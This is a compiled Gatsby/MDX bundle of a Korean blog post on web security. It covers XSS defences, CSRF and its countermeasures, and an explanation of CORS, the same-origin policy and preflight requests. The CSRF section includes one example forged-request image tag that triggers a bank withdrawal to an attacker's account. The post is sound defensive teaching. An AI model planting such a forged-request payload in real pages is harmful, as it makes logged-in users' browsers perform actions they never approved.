focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"XSS 대응 방법\"), \"\\n\", React.createElement(_components.ol, null, \"\\n\", React.createElement(_components.li, null, \"Input Validation 적용 (secure coding 가이드)\", \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"프론트 단 혹은 서버 단에서 입력한 정보가 영구히 저장되기 전에 검증하는 것이 좋다.\"), \"\\n\", React.createElement(_components.li, null, \"XSS Cheat Sheet에 대한 필터 목록을 만들어 대응한다.\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"스크립트로 해석될 여지가 있는 특수문자들을 인코딩해서 보여주기 (secure coding 가이드)\", \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, React.createElement(_components.code, null, \"&\"), \" -> \", React.createElement(_components.code, null, \"&amp;\")), \"\\n\", React.createElement(_components.li, null, React.createElement(_components.code, null, \"\\\"\"), \" -> \", React.createElement(_components.code, null, \"&quot;\")), \"\\n\", React.createElement(_components.li, null, React.createElement(_components.code, null, \"<\"), \" -> \", React.createElement(_components.code, null, \"&lt;\")), \"\\n\", React.createElement(_components.li, null, \"등등 이렇게 특수문자들을 매핑해서 인코딩 해준다.\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"보안 라이브러리 활용\"), \"\\n\", React.createElement(_components.li, null, \"Cookie를 설정할 때 \", React.createElement(_components.code, null, \"httpOnly\"), \"옵션을 설정한다.\", \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, React.createElement(_components.code, null, \"document.cookie\"), \"와 같은 브라우저 API로는 cookie 정보를 확인할 수 없다.\"), \"\\n\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.h2, {\n    id: \"csrf-cross-site-request-forgery-크로스-사이트-요청-위조\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#csrf-cross-site-request-forgery-%ED%81%AC%EB%A1%9C%EC%8A%A4-%EC%82%AC%EC%9D%B4%ED%8A%B8-%EC%9A%94%EC%B2%AD-%EC%9C%84%EC%A1%B0\",\n    \"aria-label\": \"csrf cross site request forgery 크로스 사이트 요청 위조 permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"CSRF (Cross-site Request Forgery; 크로스-사이트 요청 위조)\"), \"\\n\", React.createElement(_components.p, null, \"CSRF는 아래와 같은 조건이 만족할 때 실행된다:\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"사용자가 공격자가 만든 피싱 사이트에 접속한 경우\"), \"\\n\", React.createElement(_components.li, null, \"사용자가 위조 요처을 전송하는 서비스에 로그인이 되어있는 경우\"), \"\\n\"), \"\\n\", React.createElement(_components.p, null, \"만약 해커가 만든 웹사이트에서 로드한 웹페이지에 다음과 같은 악의적인 이미지 태그가 있다고 생각해보자.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-html\"\n  }, \"<img\\n  src=\\\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\\\" />\\n\")), \"\\n\", React.createElement(_components.p, null, \"은행 계좌에 로그인하고 있고, 쿠키가 유효하고, 해당 withdraw API 호출에 쿠키 이외의 별다른 검증절차가 존재하지 않는다면 해당 이미지를 포함하고 있는 HTML을 로드하자마자 돈이 송금될 것이다.\"), \"\\n\", React.createElement(_components.h5, {\n    id: \"csrf-공격-대응-방법\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#csrf-%EA%B3%B5%EA%B2%A9-%EB%8C%80%EC%9D%91-%EB%B0%A9%EB%B2%95\",\n    \"aria-label\": \"csrf 공격 대응 방법 permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"CSRF 공격 대응 방법\"), \"\\n\", React.createElement(_components.p, null, \"CSRF는 공격받는 서버 측에서 방어해야한다.\"), \"\\n\", React.createElement(_components.ol, null, \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"모든 민감한 동작에는 확인절차를 더 준비한다.\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"CORS 설정을 통해 요청을 허용하는 Cross-Origin을 제한한다.\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"Referer 헤더를 활용해서 검증할수도..\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"민감한 동작에 사용되는 쿠키는 짧은 수명만 갖도록 한다.\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"CSRF 대조용 토큰을 항상 비교한다.\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"사용자 session에 임의의 난수 값을 저장하고, 사용자 요청 시 해당 값을 포함해 전송시킨다. 서버 측에서 request를 받을 때 저장된 토큰 값과 요청 파라미터로 전달받는 토큰 값이 일치하는지 검증 과정을 거친다.\"), \"\\n\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.h2, {\n    id: \"cors-cross-origin-resource-sharing\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#cors-cross-origin-resource-sharing\",\n    \"aria-label\": \"cors cross origin resource sharing permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"CORS (Cross Origin Resource Sharing)\"), \"\\n\", React.createElement(_components.blockquote, null, \"\\n\", React.createElement(_components.p, null, React.createElement(_components.a, {\n    href: \"https://medium.com/@lifthus531/cors%EC%97%90-%EB%8C%80%ED%95%9C-%EA%B9%8A%EC%9D%80-%EC%9D%B4%ED%95%B4-8c84c2137c83\",\n    target: \"_self\",\n    rel: \"nofollow\"\n  }, \"https://medium.com/@lifthus531/cors에-대한-깊은-이해-8c84c2137c83\")), \"\\n\"), \"\\n\", React.createElement(_components.p, null, \"브라우저는 가장 기초적인 웹 보안으로 \", React.createElement(\"u\", null, \"SOP (Same Origin Policy)\"), \"를 적용한다. SOP란 요청을 보내는 \", React.createElement(\"u\", null, \"출처 Origin과 동일한 Origin에만 통신을 허락\"), \"하는 정책이다.\"), \"\\n\", React.createElement(_components.p, null, \"이 SOP 정책을 완화하여 \", React.createElement(\"u\", null, \"동일한 Origin이 아닌 경우(Cross-Origin)에도 통신을 허용\"), \"하는 것을 \", React.createElement(_components.strong, null, \"CORS\"), \"라고 한다.\"), \"\\n\", React.createElement(_components.h5, {\n    id: \"cross-origin-same-origin\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#cross-origin-same-origin\",\n    \"aria-label\": \"cross origin same origin permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"Cross Origin, Same Origin\"), \"\\n\", React.createElement(_components.p, null, React.createElement(_components.code, null, \"Origin\"), \" 헤더는 해당 HTTP Request가 어느 Origin으로부터 전송되었는지를 알려준다. 예를들어, \", React.createElement(_components.code, null, \"https://leobang.me/posts/124\"), \"의 웹페이지에 있는 script를 통해 두 번의 GET 요청이 전송되었다고 가정해보자.\"), \"\\n\", React.createElement(_components.ol, null, \"\\n\", React.createElement(_components.li, null, React.createElement(_components.code, null, \"https://leobang.me/api/posts/124\")), \"\\n\", React.createElement(_components.li, null, React.createElement(_components.code, null, \"https://s3.ap-southeast2.amazonaws.com/bucket/xxxxxx\")), \"\\n\"), \"\\n\", React.createElement(_components.p, null, \"1번의 경우 scheme(프로토콜)과 도메인이 동일하므로 (포트넘버는 scheme에 종속되므로 생략) Same Origin이다. 2번의 경우 scheme은 동일하지만 도메인이 다르므로 Cross Origin이다.\"), \"\\n\", React.createElement(_components.p, null, \"SOP 정책을 고수하는 경우 2번 요청은 전송되기 전에 브라우저에 의해 block되고, 다음과 같은 에러를 브라우저 콘솔을 통해 확인할 수 있을 것이다···!\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, null, \"Access to XMLHttpRequest at '서버의 origin' from origin '요청의 출처 Origin' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.\\n\")), \"\\n\", React.createElement(_components.h5, {\n    id: \"cors는-브라우저가-실행한다-cors-정책은-서버가-결정한다\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#cors%EB%8A%94-%EB%B8%8C%EB%9D%BC%EC%9A%B0%EC%A0%80%EA%B0%80-%EC%8B%A4%ED%96%89%ED%95%9C%EB%8B%A4-cors-%EC%A0%95%EC%B1%85%EC%9D%80-%EC%84%9C%EB%B2%84%EA%B0%80-%EA%B2%B0%EC%A0%95%ED%95%9C%EB%8B%A4\",\n    \"aria-label\": \"cors는 브라우저가 실행한다 cors 정책은 서버가 결정한다 permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"CORS는 브라우저가 실행한다. CORS 정책은 서버가 결정한다.\"), \"\\n\", React.createElement(_components.p, null, \"CORS 정책은 서버 측에서 HTTP Response 헤더를 이용해 설정한다. 하지만 \", React.createElement(\"u\", null, \"CORS 정책은 브라우저에 의해 실행\"), \"된다.\"), \"\\n\", React.createElement(_components.p, null, \"만약 CORS 정책을 서버 측에서 실행하고, 정책을 위반하는 경우 에러 응답을 보내준다고 생각해보자.\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"수 많은 네트워크 트래픽이 에러 응답을 위해서 낭비될 것이다.\"), \"\\n\", React.createElement(_components.li, null, \"서버 호스트는 그대로 높은 양의 부하를 감당해야한다.\"), \"\\n\"), \"\\n\", React.createElement(_components.p, null, \"그렇기에 서버 측에서 CORS 정책을 설정해두고, 브라우저 측에서 요청을 보내기 전에 대상 Origin에 대한 CORS 정책을 검증한 후 valid하지 않은 요청은 애진작에 보내지도 않는 것이 여러모로 효율적이다.\"), \"\\n\", React.createElement(_components.blockquote, null, \"\\n\", React.createElement(_components.h5, {\n    id: \"사실-cors을-위반해도-네트워크-요청은-쬑금-간다-preflight\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#%EC%82%AC%EC%8B%A4-cors%EC%9D%84-%EC%9C%84%EB%B0%98%ED%95%B4%EB%8F%84-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%9A%94%EC%B2%AD%EC%9D%80-%EC%AC%91%EA%B8%88-%EA%B0%84%EB%8B%A4-preflight\",\n    \"aria-label\": \"사실 cors을 위반해도 네트워크 요청은 쬑금 간다 preflight permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"사실 CORS을 위반해도 네트워크 요청은 쬑금 간다 (Preflight)\"), \"\\n\", React.createElement(_components.p, null, \"위반해도(?)라기 보다는 위반하는지를 묻기 위한 간이 요청이 먼저 진행된다.\"), \"\\n\", React.createElement(_components.p, null, \"브라우저는 \", React.createElement(_components.code, null, \"HTTP OPTIONS 메서드\"), \"를 이용해 Preflight 요청을 보낸다. Preflight 요청이란 원래 보내려던 요청을 보내기에 앞서, CORS 설정과 관련해 서버에게 이 요청을 보내도 되는지 물어보는 과정이다. preflight는 요런식이다.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, null, \"OPTIONS /resource/foo\\nAccess-Control-Request-Method: DELETE\\nAccess-Control-Request-Headers: origin, x-requested-with\\nOrigin: https://foo.bar.org\\n\")), \"\\n\"), \"\\n\", React.createElement(_components.h5, {\n    id: \"cors-설정과-관련된-http-response-헤더들\",\n    style: {\n      position: \"relative\"\n    }\n  }, React.createElement(_components.a, {\n    href: \"#cors-%EC%84%A4%EC%A0%95%EA%B3%BC-%EA%B4%80%EB%A0%A8%EB%90%9C-http-response-%ED%97%A4%EB%8D%94%EB%93%A4\",\n    \"aria-label\": \"cors 설정과 관련된 http response 헤더들 permalink\",\n    className: \"header-links before\"\n  }, React.createElement(_components.div, {\n    dangerouslySetInnerHTML: {\n      __html: \"<svg aria-hidden=\\\"true\\\" focusable=\\\"false\\\" height=\\\"16\\\" version=\\\"1.1\\\" viewBox=\\\"0 0 16 16\\\" width=\\\"16\\\"><path fill-rule=\\\"evenodd\\\" d=\\\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\\\"></path></svg>\"\n    }\n  })), \"CORS 설정과 관련된 HTTP Response 헤더들\"), \"\\n\", React.createElement(_components.p, null, \"CORS 정책을 설정하기 위해 서버는 Response에 다음과 같은 HTTP 헤더들을 포함하게 된다.\"), \"\\n\", React.createElement(_components.ol, null, \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"Access-Control-Allow-Origin\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"어떠한 Origin에 대해서 Cross Origin 요청을 허용하는지 명시한다.\"), \"\\n\", React.createElement(_components.li, null, React.createElement(_components.code, null, \"*\"), \"라고 설정하는 경우 모든 Origin으로부터의 요청을 허용하는 셈\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"Access-Control-Allow-Methods\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"어떤 메서드를 허용하는지\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.li, null, \"\\n\", React.createElement(_components.p, null, \"Access-Control-Allow-Headers\"), \"\\n\", React.createElement(_components.ul, null, \"\\n\", React.createElement(_components.li, null, \"preflight 요청 이후 실제 요청에서 포함될 헤더를 특정한다.\"), \"\\n\"), \"\\n\"), \"\\n\"), \"\\n\", React.createElement(_components.p, null, \"기타 등등··· credential이나 preflight 요청 결과를 브라우저가 얼마동안 캐싱할 것인지도 설정할 수 있다.\"));\n}\nfunction MDXContent(props = {}) {\n  const {wrapper: MDXLayout} = Object.assign({}, _provideComponents(), props.components);\n  return MDXLayout ? React.createElement(MDXLayout, props, React.createElement(_createMdxContent, props)) : _createMdxContent(props);\n}\nexport default MDXContent;\n","import GATSBY_COMPILED_MDX from \"/Users/leobang/blog-starter/documents/Web/웹공격.md\";\nimport React from 'react';\nimport {graphql} from 'gatsby';\nimport ArticleLayout from 'components/Layout/ArticleLayout';\nimport MarkdownWrapper from 'components/MarkdownWrapper';\nimport ArticleFrontmatter from 'components/ArticleFrontmatter';\nimport ArticlePageContext from 'contexts/ArticlePageContext';\nimport Utterances from 'components/Utterance';\nimport RecentPosts from 'components/RecentPosts/RecentPosts';\nconst isBrowser = typeof window !== undefined;\nconst ArticlePage = ({data, children, serverData}) => {\n  const {prevPost, nextPost} = data;\n  const frontmatters = {\n    ...data.mdx.frontmatter,\n    timeToRead: data.mdx.fields.timeToRead\n  };\n  return React.createElement(ArticlePageContext, {\n    data: data\n  }, React.createElement(ArticleLayout, null, React.createElement(ArticleFrontmatter, frontmatters), React.createElement(MarkdownWrapper, null, children), React.createElement(RecentPosts, {\n    prev: prevPost,\n    next: nextPost\n  }), React.createElement(Utterances)));\n};\nArticlePage\nexport default function GatsbyMDXWrapper(props) {\n  return React.createElement(ArticlePage, props, React.createElement(GATSBY_COMPILED_MDX, props));\n}\nexport const query = graphql`\n  query ($id: String, $nextId: String, $prevId: String) {\n    mdx(id: { eq: $id }) {\n      id\n      fields {\n        slug\n        timeToRead\n        categoryDirectory\n      }\n      frontmatter {\n        title\n        createdAt(formatString: \"MMMM DD, YYYY\")\n      }\n      tableOfContents\n    }\n    prevPost: mdx(id: { eq: $prevId }) {\n      fields {\n        slug\n      }\n      frontmatter {\n        title\n      }\n    }\n    nextPost: mdx(id: { eq: $nextId }) {\n      fields {\n        slug\n      }\n      frontmatter {\n        title\n      }\n    }\n  }\n`;\nexport {ArticlePageHead as Head} from 'components/head';\n"],"names":["_createMdxContent","props","_components","Object","assign","blockquote","p","h2","a","div","code","pre","h5","ol","li","ul","strong","_provideComponents","components","React","id","style","position","href","className","dangerouslySetInnerHTML","__html","target","rel","wrapper","MDXLayout","ArticlePage","data","children","serverData","prevPost","nextPost","frontmatters","mdx","frontmatter","timeToRead","fields","ArticlePageContext","ArticleLayout","ArticleFrontmatter","MarkdownWrapper","RecentPosts","prev","next","Utterances","GatsbyMDXWrapper","GATSBY_COMPILED_MDX"],"sourceRoot":""}